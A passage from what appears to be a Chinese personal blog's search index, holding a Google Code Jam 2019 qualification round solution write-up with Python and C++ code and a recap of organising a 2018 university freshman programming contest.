资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 1 由于 $N \u003c 10^5$，暴力枚举 $A$ 然后检查一下 $A$ 和 $N-A$ 都包不包含 $4$ 就可以了。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:2","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 2 由于 $N\u003c10^9$，枚举肯定不行了，我们可以考虑这么做：随机选一个在区间 $[1,N-1]$ 内的数 $A$，然后检查是否 $A$ 和 $N-A$ 都不包含 $4$ 就可以了。这样的做法是肯定没有问题的，但是复杂度够吗？ 对于 $A$ 来说，我们考虑一下选出来这个数不包含 $4$ 的概率。这个概率很好求，由于每一位都是独立的，所以这个概率是 $(\\frac{9}{10})^9 \\approx0.387$。假如 $N-A$ 含有 $4$ 怎么办？我们可以考虑稍微的对 $A$ 做一下加减扰动一下，如果怎么扰动都含有 $4$，我们就重新随机。这样大概重复 100 次，我们最终的概率就是 $5.9\\times10^{-42}$，几乎可以认为是 $0$ 了，这样就能得到一个解。 Analysis 里面讲了一个更严格的随机化证明，但是实际上这个东西有点杀鸡焉用牛刀了，而且明显有一个更 straightforward 的做法，我就不抄了。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:3","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 3 $N\u003c10^{100}$，这么大个数字暴力还是随机化啊？ 我相信绝大部分正常人都会想到这个解法：直接按位拆分，如 $7$ 分解成 $2+5$，顺序枚举每个位构造两个数就可以了，$\\mathcal{O}(\\text{len}(N))$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:4","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Code ## Full score, 6+10+1 T = int(input()) change = ['0', '0', '1', '1', '2', '2', '3', '2', '3', '3'] change_rev = [str(i - int(change[i])) for i in range(10)] for kase in range(T): num = input() print( 'Case #%d: %s %s' % (kase + 1, ''.join(change[int(it)] for it in num), ''.join(change_rev[int(it)] for it in num))) ","date":"2019-04-11","objectID":"/post/2201e4f5/:1:5","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"B. You Can Go Your Own Way 白给题 2 号。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:0","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"题意 你从一个 $N\\times N$ 大小的网格的起点 $(0,0)$ 开始走，只能向下（按题目说法，南，S）或者向右（东，E），走到 $(N,N)$。Lydia 已经走了这么一条路了，你不能重复她走过的任何一条路径，如她经过了路径 $(3,4)\\to(3,5)$，你就不能走着一条路径，但经过相同的格子是允许的。给出 Lydia 的行走序列，请给出任何一种可行的方案。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:1","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 1 $2\\le N\\le 10$。直接枚举每一步怎么走然后模拟验证即可，$\\mathcal{O}(N\\cdot2^N)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:2","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 2 $2\\le N \\le 1000$。考虑从 $(0,0)$ 开始 DFS，直到走到 $(N,N)$ 位置，中间一旦遇到任何 Lydia 走过的路径就剪枝减掉。复杂度 $\\mathcal{O}(N^2)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:3","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 3 至多十个测试点 $2\\le N\\le 50000$，剩余测试点 $1\\le N\\le 10000$。这个限制下肯定不能 DFS 了，我们来尝试其他做法。 如果你在纸上随便这么画一个网格，可能会得到一个观察：如果我沿对角线 $(0,0)-(N,N)$ 对 Lydia 走的路做一下对称，这样产生的新路径一定和 Lydia 走过的路没有任何重合。 我们来证明这个观察是对的。假设我们走了 $X$ 步右和 $Y$ 步下，那有一个直观的观察是，无论我们这几步右和下是怎么走的，我们最终来到的都是 $(X,Y)$ 这个点。也就是说，我们的位置和走法顺序无关，只和每个方向走了多少步有关。 那接下来我们来讨论两种情况： $X=Y$ 时，我们必定和 Lydia 相遇在同一个点，根据我们的策略，下一步我们走出的路径必定是 Lydia 所走路径的对称路径。这也就是说我们一定走出了和 Lydia 不同的路径。 $X\\ne Y$ 时，此时刚好会有$X_M=Y_L, Y_M=X_L$，我们所在的点也和 Lydia 所在的点沿对角线对称，我们更是不可能复用 Lydia 走过的路径。 所以这条对称的路径一定不会和 Lydia 的路径有重合的地方。那么我们直接构造这一条沿对角线对称的路线即可。实现上来说，就是 Lydia 如果走了 E 那我们就走 S，反之亦然。复杂度 $\\mathcal{O}(N)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:4","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Code ## Full score, 5+9+10 T = int(input()) for kase in range(T): input() R = input() ans = [] for it in R: if it == 'S': ans.append('E') else: ans.append('S') print(\"Case #\", end='') print(kase + 1, end='') print(':', ''.join(ans)) ","date":"2019-04-11","objectID":"/post/2201e4f5/:2:5","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"C. Cryptopangrams 这个题有点意思，但是还是比较基础的数论题。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:3:0","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"题意 选择 26 个不大于 $N$ 的不同的质数，然后把 A-Z 从小到大一一对应到每一个质数上。然后我们对一个长度为 $L+1$ 的原文 $S$ 执行如下的加密操作：每相邻两位乘起来，得到一个 $L$ 长度的序列：$E_1=P_{S_1}\\cdot P_{S_2}, \\cdots, E_L=P_{S_L}\\cdot P_{S_{L+1}}$。现在给定 $N, L, \\{E_i\\}$，求原文 $S$。$25\\le L\\le 100$，保证每个字母都在 $S$ 中出现过一次。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:3:1","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 1 $1\\le N\\le 10000$。由于限制很宽裕，质数的个数不超过 $10^4$ 个，埃筛一下然后每个数逐个测试一下，得到这个序列。 得到这个序列之后需要解密，解密过程看起来很复杂其实很简单，这是一个链式过程：由于我们知道 $E_1$ 是由前两个字母对应的数乘起来的，那么我们就找到这两个质数，分别测试一下就可以了：假定找到的两个解为 $P_1, P_2$，我们先使用 $p_1=P_1$ 去测试，这样我们就能得到 $p_2=E_2/p_1$，然后有了 $p_2$ 就能继续链式求下去。如果我们在这个过程中遇到了 $\\gcd(p_i, E_{i+1})=1$ 的情况，那么代表这个链式操作出现了问题，$p_1$ 就不可能是 $P_1$，那答案就是 $P_2$，反之亦然。所以我们两次测试加上链式操作就可以解密出整个原文来。总复杂度为 $\\mathcal{O}(NL+L)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:3:2","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 2 $1\\le N\\le10^{100}$。这个数实在是太大了，不可能挨个试所有质数。所以我们换个思路：求出所有可能的质数。 我们考虑一个简单的字符串： ABC，这样产生的序列为：$P_\\text{A}\\cdot P_\\text{B},P_\\text{B}\\cdot P_\\text{C}$。由于 $P_\\text{A}, P_\\text{B}$ 和 $P_\\text{C}$ 是三个互不相同的质数，他们不会有任何的相同质因子，所以我们对上述两个数求一下最大公约数是多少？$P_\\text{B}$！也就是说，我们只需要顺着求一遍相邻每两个数的质因子，然后就可以得到三个我们加密过程中用到的质数。排个序然后去一下重就可以了，拿一个 set 维护一下更方便。求最大公约数用辗转相除法就行，复杂度 $\\mathcal{O}(\\log N)$。 然而，上面的做法没有考虑到一个 case：ABA。这样得到的两个数 $E_1, E_2$ 是相等的，我们求不出任何一个质因子。这个问题的解决方法需要这样的一个观察：由于 26 个字母都会出现一次，也就是说，我们可以求出至少一个满足要求的质数。所以，我们并不一定需要求出 $P_\\text{A}$ 或者 $P_{B}$，只要我们求出了其他一个质因子，最终都可以在链式的操作下求出这两个数。为了满足这个要求，我们只需要枚举每两个数，看看这两个数是否有一个公共的质因子，如果有的话，我们就可以顺着求出其他 25 个质数了，这个操作显然是 $\\mathcal{O}(L^2)$ 的，由于 $25 \\le L\\le 100$，复杂度完全足够。 在求出所有质数之后，我们执行一遍测试集 1 的解密过程就行。总复杂度 $\\mathcal{O}(L^2\\log N+L)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:3:3","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Code ## Full score but upsolved from math import gcd T = int(input()) def test(A, st, L): ret = [0] * L ret[0] = A[0] // st for idx in range(1, L): g = A[idx - 1] // ret[idx - 1] if gcd(A[idx - 1], g) == 1: return False, [] ret[idx] = g return True, ret for kase in range(T): N, L = map(int, input().split()) A = list(map(int, input().split())) prime = set() ans = list() for i in range(L): for j in range(i + 1, L): g = gcd(A[i], A[j]) if g != 1 and g != A[i]: prime.add(g) prime.add(A[i] // g) prime.add(A[j] // g) prime = list(sorted(prime)) for it in prime: if A[0] % it == 0: ret, ans = test(A, it, L + 1) if ret: break print(\"Case #%d: %s\" % (kase + 1, ''.join( chr(ord('A') + prime.index(it)) for it in ans))) ","date":"2019-04-11","objectID":"/post/2201e4f5/:3:4","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"D. Dat Bae 这个题就非常好玩了，可以说是构造解中的典范。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:4:0","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"题意 你有一个建在深山中的数据库，但是这个数据库最近出了问题。这个数据库是一个 $N$ 个 worker 组成的集群，编号为 $0\\sim N-1$，你现在可以使用一个函数调用 TEST_STORE 发送一个长度为 $N$ 的 01 串给你的数据库，每台机器在收到消息后原样返回，也就是调用会给你返回完全相同的串。然而，有 $B$ 台 worker 坏了，这 $B$ 台机器并不会返回任何东西，也就是说，此时 TEST_STORE 调用只会给你返回 $N-B$ 长度的串。假设 $N=5,B=2$ 且坏掉的机器是 0 号和 3 号，那么调用会发生下面的结果： TEST_STORE 01101 返回 111。 TEST_STORE 00110 返回 010。 TEST_STORE 01010 返回 100。 TEST_STORE 11010 也返回 100。 由于建在深山中的原因，TEST_STORE 调用的代价十分昂贵，所以你只能进行至多 $F$ 次调用。交互的向系统提出至多 $F$ 次询问，并给出坏了的 $B$ 台 worker 的编号。$2\\le N\\le 1024, 1\\le B\\le \\min(15,N-1)$。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:4:1","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 1 $F=10$。我们考虑把这十次询问顺序从上到下排列起来，那这就是一个有 $N$ 列，10 行的 01 矩阵。现在我们不按行去看，而按列去考虑：假如某台机器 $a$ 坏了，那么在这个矩阵中，$a$ 列会全部消失。那现在问题就是，我们如何去定位这些消失的列。注意到每一列为一个 10 长度的 01 串，我们如果从上往下拿出某一列然后把它转置一下会得到什么？一个 10 长度的二进制数！由于共有 10 位，所以可以表示的最大数字是 $2^{10}=1024\\ge N$！ 所以，我们把 $0\\sim N$ 用二进制编码出来，然后把它全部转置之后拼起来，并逐行询问，得到答案矩阵后再反向解码，这里面缺少的数就是那些坏掉的机器的编号，输出即可。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:4:2","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Test Set 2 $F=5$。此时 $2^5=32$，无法再像测试集 1 的做法去做了。不过，测试集 1 给到我们的提示就是如何设计编码协议，所以，我们来考虑如何在这个限制下设计编码协议。 注意到 $2^5=32\u003eB=\\min(15, N-1)$，也就是说，即使是连续的 $B$ 台机器损坏了，我们接收到的错误序号也在一次完整的编码范围内。这提示我们，可以分块：分成长度为 $32$ 的多个块，循环给每个块编码为 $0\\sim31$，然后如上题一样的做法进行询问和解码。由于 $2^5\u003eB$，如果连续的 $B$ 台设备损坏了，这一组损坏的机器只可能在某一块之内或者处于两块的交界，我们在顺着扫的过程中都能定位到这些缺失的编码，那么，对于更少的机器，我们自然也可以如此定位。与此同时，由于 $2^5\u003eB$，连续损坏的机器不可能为完整的一块，所以我们能保证扫一遍定位出来的机器编号是唯一确定的。所以，这个做法是正确的。 而由于 $2^4=16\u003eB$，我们甚至可以只使用 $4$ 次询问就得到答案！（见下面代码）为什么？我们假设 $B=16$，如果我们连续的 $B$ 台机器损坏了，那么可能损坏了完整的一块，这给我们定位带来了难度：考虑有四个循环编号的块 1 | 2 | 3 | 4，这四块是完全相同的。假设其中的某一块丢失，如 2 完整丢失了，那给我们返回的结果是 1 | 3 | 4。注意到问题了吗？这样的返回结果我们同样可以解释成 1 | 2 | 3 或者 2 | 3 | 4 等等。也就是说，如果 $2^4\\ge B$ ，当完整的一块丢失的时候，我们完全无法定位丢失块的位置，我们也就无法唯一确定丢失编号了。而如果是大于关系，这样的要求就完全可以满足，所以，$F=4$ 的情况下，我们就可以得到答案。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:4:3","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["趣题记录"],"content":"Code // Full score but upsolved #include \u003cbits/stdc++.h\u003e using namespace std; string numbers[]{ \"0000\", \"0001\", \"0010\", \"0011\", \"0100\", \"0101\", \"0110\", \"0111\", \"1000\", \"1001\", \"1010\", \"1011\", \"1100\", \"1101\", \"1110\", \"1111\"}; int main() { ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr); int T; cin \u003e\u003e T; for (int kase = 1; kase \u003c= T; kase++) { int N, B, F; cin \u003e\u003e N \u003e\u003e B \u003e\u003e F; vector\u003cint\u003e ans; vector\u003cstring\u003e res(4); for (int i = 0; i \u003c 4; i++) { stringstream ss; for (int p = 0; p \u003c N; p++) ss \u003c\u003c numbers[p % 16][i]; cout \u003c\u003c ss.str() \u003c\u003c endl; cin \u003e\u003e res[i]; } int cur = 0; for (int i = 0; i \u003c N - B; i++) { stringstream ss; for (int p = 0; p \u003c 4; p++) ss \u003c\u003c res[p][i]; int n = lower_bound(numbers, numbers + 16, ss.str()) - numbers; while (cur % 16 != n) { ans.push_back(cur); cur++; } cur++; } while (cur \u003c N) { ans.push_back(cur); cur++; } assert(ans.size() == B); for (int i = 0; i \u003c B; i++) { cout \u003c\u003c ans[i]; if (i == B - 1) cout \u003c\u003c endl; else cout \u003c\u003c ' '; } int t; cin \u003e\u003e t; assert(t == 1); } } 说实话， Qualification Round 难度实在是过于简单了，整体水平就 CF Div 2 A~D 的水平，这也就导致了晋级了将近 2 万 7 千人，而 Round 1 要从这些人里面选 4500 人晋级下一轮，接下来可能白给的就是我了。 Anyway，省赛也快了，做点题回复一下手感，如果能晋级更好。不出意外的话，我们下一轮见。 ","date":"2019-04-11","objectID":"/post/2201e4f5/:4:4","tags":["题解","GCJ","Google Code Jam 2019","算法","算法竞赛"],"title":"Google Code Jam 2019 资格轮题解","uri":"/post/2201e4f5/"},{"categories":["个人记录"],"content":"2018 年的哈尔滨工业大学（威海）ACM 新生程序设计竞赛上周结束了～ 作为这次的主命题人，这一次也是搞了一个多月才选好题造好数据写好 Checker，最终呈现给所有的新生。 题目的材料在：https://github.com/lxdlam/hitwh-2018-newbie，有什么问题欢迎给我提 Issue。 这篇文章就记录一下整个过程吧。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:0:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"命题准备 确定命题的准备是大概从青岛站结束的时候开始的。 去年宁神出题非常牛逼，冠军亚军 3 题，然后就是 2 题的 1 题的，情况非常惨烈。所以今年命题的时候准备就是有一点层次感，每个题大家都能动一动手，但是到底能不能做还是得看个人的本事。 一开始命题的时候的方案是，保证使用 C 语言可以写出每个题目，然后准备 2 题防 AK，8 题算法题，难度还略有上升。后面通知发出去发现是 8 题，所以砍了一个防 AK，砍了一个数学题。 方案出来了以后就征集了一波题目，由于当时 LFhase 他们的队还要准备焦作站，所以主要的出题方案是我们队和 SRC 他们队一起进行的。选题过程比较复杂，中间有几个拆换，最后总算是凑齐了 Idea，然后就开始了命题过程。 今年的命题过程全程使用 Polygon，这个平台真的就如它的 Slogan 一样，非常的专业。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:1:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"各题命题过程 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"A. Arcaea 这题是我在把分数输进 Arcaea ptt 计算器的时候突然想到的，那个时候我才 ptt 10.8，刚好遇到瓶颈，想写一个简单的打什么推荐工具，所以看了一下午 Wiki，正好就想出一个相关的题目。然而官方的计算方式需要队列而且很绕（大概是个堆），大部分新生肯定处理不了，所以我简化了一下计算方法。 题目出起来还是比较简单的，因为毕竟就是一个简单的数据处理题，所以数据生成也是分段随机的。第一轮验题结束之后 blaction 发现有个问题：由于存在相同的 ptt，如果用的是不稳定的排序（比如 C++ 的 sort，有可能会用快排），有可能会破坏 ptt 的时序。想了想还是不给新生挖坑了，就连夜重写了 Validator，然后手上的数据全都报废了_(:зゝ∠)_，又连夜重新生成了数据，做成了现在这个样子。 验题的时候也很有趣，由于第一版题面写的有一些问题，包括这个题目也很细节，大家都是 -1 之后先问我是不是数据或者标程有问题（。 但是直到比赛结束之后我都不明白为什么把大家安排的不明不白的。 对了，这个题的样例是比赛前一周才出来的，在这之前验题都是对着空气验题，Rua。 现在我已经 ptt 11.30 了。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:1","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"B. Battlestations Pacific 这个题原来是一个大模拟，但是 SRC 出的两版题目都太复杂了，然后 blaction 说道这套题目没有一个搜索题，所以我就出了一个搜索题。（所以 SRC 咕了我 这个题原本的思路 Google Kickstart 和 百度之星 都出过，我也就是拿出来改造改造就出了。一开始的想法就是先观察规律，然后直接 $\\mathcal{O}(\\log K)$ 分治 DFS 下去就可以了。 验题的时候 SRC 被爆 long long 卡了个 TLE，疯狂质疑自己，结果发现爆了 long long 然后就跑路吃饭去了。 这个题最终过得人数比预想得多，大家找规律的能力还是挺强的嘛。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:2","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"C. Cities: Skylines 原本这个题是留给 SRC 的大模拟的，后面把 B 题占了之后就调整到这里了。 这个题就是青岛最后一题，给大家的签到奖励。题面就一晚上就写出来了，我打开 Steam 直接搜索 C 蹦出来第一个就是《城市：天际线》，我就随便编了个故事出来。 这题居然还有人 WA 出 12 发，我也想不通。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:3","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"D. Dragon Quest 题目的想法来自今年暑假牛客多校的一道题目。当时我在大连摸鱼，离下课还有一会儿这场比赛开打了，我读了读题目就迅速切了这个题。然后出题的时候就想起来直接出，经典算法题之一。 和原题比起来，砍了两个难度。 原题要求的是 $[L,R]$ 区间内的方案和，需要做一个前缀和处理一下，这个东西新生很少有人能懂怎么预处理，就自然砍掉了。 原题的模数是 $10^9+7$，然而有几个有希望的新生之前问到我的时候都对一步一模不熟悉，所以出成 $2^{64}$。 最后出完题目有个想不到的地方：比起手动取模，直接溢出居然速度能这么快，时限上就收紧了。 验题的时候，codeyh 大佬给我说组合做法能不能做，我感觉行，但是不是很确定。他交了一发 WA 之后我越看越感觉真，连夜写了个 $10^9+7$ 版本的测了一下，发现是可以的，当时就和验题组讨论了一下，最后的决定是不改了，新生没几个能想到组合做法。但是比赛的时候真的有新生想到了，这一届好苗子真的多。 比赛的时候榜被带歪了，最后封榜之后大家的攻的方向就错了。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:4","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"E. Ever17 -the out of infinity- 这个题找游戏是最难找的，找了一大圈实在是找不到，只能硬套神作 E17 了。 题目几乎就是 Facebook Hackercup 2018 Qualification Round B 原题，由于这个题系数没用，我把系数加强了一圈。同时，由于本题的答案很明显，所以我在输出部分认真写了很多骗人的输出。（这个坏习惯是来自于 EOJ，他们的题面也经常骗人 这个题验题的时候两位大佬都被演了，第一版代码都包含 INF 这个输出。我还给 codeyh 大哥发了个错的 Clarification _(:зゝ∠)_，被批为算协裁判 其实认真在纸上推一下就能很简单发现系数的无关性，那么判一下 $n$ 再读掉所有系数这个题就做完了。结果比赛的时候只有一位大佬做了，可能题面写的很吓人和没人过就导致大家都不敢开，其实这个题是一个很水的题。以后出题还是要考虑骗的力度小一点。不骗人？那是不可能的。 插句题外话，我当时打比赛的时候不敢交，因为 FBH 是 OI 赛制还是只允许交一次那种，我犹豫了将近半个小时才敢交。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:5","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"F. Fire Emblem 我唯一留下的防 AK 题。这个题是改编自 JAG 2013 Spring 的题目，最早我知道这道题目来自叉姐的 FFT Slider。 这个题当时给我留下了很深的印象。首先的话，这个题直接做是想不到居然是 FFT 的，题目的 Idea 非常巧妙。然后，这个题让我了解了一系列日本的题目，我也参照了往年的榜单，东大、早稻田等名校在 World Finals 排行榜上名次也非常稳定，而且，日本选手主要使用 Java，在性能上和 C++ 有着不可逾越的鸿沟，这就导致日本的出题方向更接近于国际主流 ACM 出题方向：主要是思路和算法，模板和数据结构都当工具使用。今年的训练计划也会加上这一条。 说回本题，本题的题面应该是最早写完的。出的时候特别注意了一下 $N$ 的范围，由于原题给了 8s，所以很在意这个时间是不是因为 Java 而给了很多缩放。算了下大概的复杂度是 $\\mathcal{O}(N^2 \\log N)$，常数也比较大，如果令 $N=10000$ 本地也跑了很久，而 $N=1024$ 情况下最终不优化的 FFT 本地和 Polygon 上大概是 3.5s，评测机上是 5s。按照两倍时限原则，给了 8s。 题面完善了两次，加了很多东西。数据参照原题加强了两次，所以这个题的数据应该也是这 8 题里面最强的。 没人过，意料之内。有人交暴力，也是意料之内。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:6","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"G. Grand Theft Auto 最早的 G 不是这个题，是一个打印蛇形矩阵。想了想，好像有点安排，而且大家做起来也会很难受。正好之前做了这么类似的构造题，所以就这么出了个题。 $N$ 的形式非常像今年沈阳现场赛的一题，而题目的原型来自于一场 EOJ Monthly。 这个题验题出了三个做法： 出题人分奇偶构造：奇数 $0,N,N,1$，偶数 $0,N,0,N$。 blaction 直接构造如下形式：$1,1+N,1,1+N$。 codeyh 在听完我的做法后没有被我带跑，直接一发 $0,0,0,N$ 就 A 掉了. 结果 codeyh 验完题一下子就把这题难度拉低了一个档次。然后验题组讨论了一圈，提示上给出了两个很关键的运算律。 预计上这个题过的人应该比 H 多，结果反过来了。可能还是构造或者异或不熟？ ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:7","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"H. Hacknet Idea 来自于某场牛客小白赛。这个题之前是在我题库里面出好的，直接拿过来就用了，也没有什么复杂的。 写题解的时候两度把自己绕进去了，写着写着自己都蒙了。 真的有人直接复制代码就交啊，出题人真的会在题目里面写答案的？ ","date":"2018-12-30","objectID":"/post/7f2851ba/:2:8","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"最后调整 给 F 写了 C 标程。 在 CF 上给 F 开了 16s 然后交了一发 Java 暴力，得到一个 TLE，于是安心给 Java 开了两倍时限。 在 domjudge 上测了所有代码，确定都获得了预期结果。根据评测机结果调整了所有题目的时空限制。 写了题解，最终调整了题面的某些描述和生成题面。 花了两晚上出了热身赛，还把热身赛 B 的 Checker 写错了，十分丢人。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:3:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"比赛现场发生的事（裁判视角） 可能有的记得不是很清，也有些时间线有问题，就当一个乐子看吧。 C 题被首 A，而且是两位大佬同时提交，达到了出题人心理预期。 即使 Clarification 说了，还是有人往 Clarification 交代码。 D 被一瞬间干掉~~（然后榜歪了~~，接下来大家都在交 C。 A 题 Rk 1 吃了一个 WA 之后，插了眼的老哥看了看说大佬在搞 B。 A、B 和 H 很短时间间隔之内被三位同学分别一血，感叹这一届真的好苗子很多。 然后大家开始卡题，主要进攻方向是 B 和 H。 Rk 1 大佬搞出 B 之后去搞 G。 裁判组都蒙了，G 这种大水题怎么没人做。 有人一血 G，某位裁判直接榜锁定这个人，几乎是明示。 Rk 1 大佬还没出 H，插眼大哥很急。 有人 D 交了组合做法，我很惊喜，但是还是很抱歉，这是过不去的。 榜单逐渐平稳，Rk 1 大佬做出来了 G，开始搞 H，这个时候有不少 3 题的同学。 大家也开始攻 G。 Rk 1 大佬终于写出 H，裁判组看了看 G 和 H 的代码都蒙了，怎么会这么长。 忙里偷闲讨论了一下训练和选拔方案。 Rk 1 出了 A，突破了 6 题线，此时距封榜没有多久了。4、5、6 题都有人，这一届水平值得期待。 封榜了。 封榜之后没多久终于有大佬一血了 E，但是也没想到这也是唯一一个 AC，甚至是唯一一个提交。 怎么所有人都在做 D 而不是 E？？？？D 显然不能做而 E 可以啊？ 还有人在疯狂交 F。 OI 大佬们终于在了一个稳定的位置，可能是 ACM 赛制还不熟导致比赛节奏掌握的不好。 封榜之后大家从各个方向追上来，有 4 题逆到 6 题的，也有 5 题平稳上 6 题的，4 题 5 题的也有不少。 比赛结束。 ","date":"2018-12-30","objectID":"/post/7f2851ba/:4:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["个人记录"],"content":"比赛结束之后 首先是讲了一下题，请各位一血大佬上来分享了一下，然后我细讲了一下，气氛还挺不错。 然后题目放到校 OJ 上，目前只有原版题目，几个加强版还在咕，应该会尽快。 榜的导出花了一番功夫。首先是 domjudge 6.0 版本引入了一个新 Bug，unfreeze 榜单之后榜单还是冻结状态，看了看 issue 直接 finalize 才获取的终榜。然后是保存到 HTML 居然有几个元素 Chrome 下丢了。最后还是选择 Chrome 打印到 PDF，这样版式更好。 获奖名单和老师争取了一下，确定是 50 人。 来自校队和老师的评价：这套题目很有含金量，出的很好。我觉得这就是我最高兴的事了。 希望大家新生杯参赛愉快！ 那最后，校赛见了！今年校赛我们 16 级会给大家准备一套更有意思的题目，期待大家的参与了！ ","date":"2018-12-30","objectID":"/post/7f2851ba/:5:0","tags":["新生杯","ACM-ICPC","算法竞赛"],"title":"2018 新生杯纪实","uri":"/post/7f2851ba/"},{"categories":["博客记录"],"content":"之前使用 Hexo 的时候，用的是 hexo-abbrlink 插件来处理永久链接，而换到了 Hugo 之后，由于 Hugo 没有插件系统，所以就采用了简单的 /year/month/day/name 形式处理永久链接。 昨晚临睡前翻了翻 Hugo 文档，发现了 Hugo 